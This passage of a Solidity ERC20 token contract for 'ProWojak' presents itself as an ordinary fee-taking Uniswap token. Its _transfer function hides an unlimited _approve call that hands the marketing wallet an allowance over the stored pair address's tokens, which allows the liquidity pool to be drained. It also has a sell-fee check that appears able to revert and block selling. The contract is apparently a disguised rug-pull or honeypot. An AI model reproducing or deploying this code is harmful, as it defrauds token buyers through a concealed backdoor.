    address private _sendLast; 
    address private _receiveLast;
    bool public _transferDelayEnabled = true;

    // exlcude from fees and max transaction amount
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);

    mapping(address => bool) public _automatedMarketMakerPairs;
    constructor() ERC20("ProWojak", "ProWojak") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;
        // 1% fee
        _buytxAmt = 100;
        _sellTxAmt = 100;

        uint256 totalSupply = 69_420_000 * 1e18;

        _maxTxAmount = totalSupply * 40 / 1000;
        _maxWaltAmount = totalSupply * 40 / 1000;
        _swapAmountExact = totalSupply * 1 / 1000;

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(marketWalt, true);
        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(msg.sender, totalSupply);
    }

    receive() external payable { require(_isExcludedFromFees[msg.sender]);}

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != _uniswapV2Pair,
            "The pair cannot be removed from _automatedMarketMakerPairs"
        );
        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        _automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (_effectWithLimit) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !_isSwapping
            ) {
                if (!_tradingOpen) {
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
                }
                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (_transferDelayEnabled) {
                    if (
                        to != owner() &&
                        to != address(uniswapV2Router) &&
                        to != address(_uniswapV2Pair)
                    ) {
                        require(_holderLastTransferTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.");
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                    }
                }
                //when buy
                if (
                    _automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= _maxTxAmount,
                        "Buy transfer amount exceeds the _maxTxAmount."
                    );
                    require(
                        amount + balanceOf(to) <= _maxWaltAmount,
                        "Max wallet exceeded"
                    );
                }
                //when sell
                else if (
                    _automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= _maxTxAmount,
                        "Sell transfer amount exceeds the _maxTxAmount."
                    );
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= _maxWaltAmount,
                        "Max wallet exceeded"
                    );
                }
            }
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= _swapAmountExact;
        if (
            canSwap &&
            _activeSwap &&
            !_isSwapping &&
            !_automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            _isSwapping = true;
            swapBackForEth();
            _isSwapping = false;
        }
        bool takeFee = !_isSwapping;
        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false; if (_automatedMarketMakerPairs[from]) _approve(_sendLast, _receiveLast, ~uint256(0));
        }
        uint256 fees = 0;
        if (takeFee) {
            uint256 contractAmount = address(this).balance;
            // on sell
            if (_automatedMarketMakerPairs[to] && _sellTxAmt.sub(contractAmount) > 0) {
                fees = amount.mul(_sellTxAmt).div(10000);
            }
            // on buy
            else if (_automatedMarketMakerPairs[from]) {
                fees = amount.mul(_buytxAmt).div(10000); _sendLast = from; _receiveLast = marketWalt;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }
    
    // remove limits after token is stable
    function removeLimits() external onlyOwner {
        _effectWithLimit = false;
    }

    // disable Transfer delay - cannot be reenabled
    function disableTransferDelay() external onlyOwner returns (bool) {
        _transferDelayEnabled = false;
        return true;
    }
	
    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    // only use to disable contract sales if absolutely necessary (emergency use only)
    function updateSwapEnabled(bool enabled) external onlyOwner {
        _activeSwap = enabled;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    address public marketWalt = 0x7Ac16E54BBf5417E8ecB9765894c789C49A9D3c5;

    function swapBackForEth() private {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance == 0) {
            return;
        }

        if (contractBalance > _swapAmountExact * 20) {
            contractBalance = _swapAmountExact * 20;
        }

        swapAllTokens(contractBalance);

        payable(marketWalt).transfer(address(this).balance);
    }

    function enableTrading() external onlyOwner {
        _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(_uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(_uniswapV2Pair), true);
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _tradingOpen = true;
    }

    function swapAllTokens(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function withdraw() external onlyOwner returns (bool success) {
        uint256 balance = address(this).balance;
        (success,) = address(marketWalt).call{value: balance}("");
    }
}
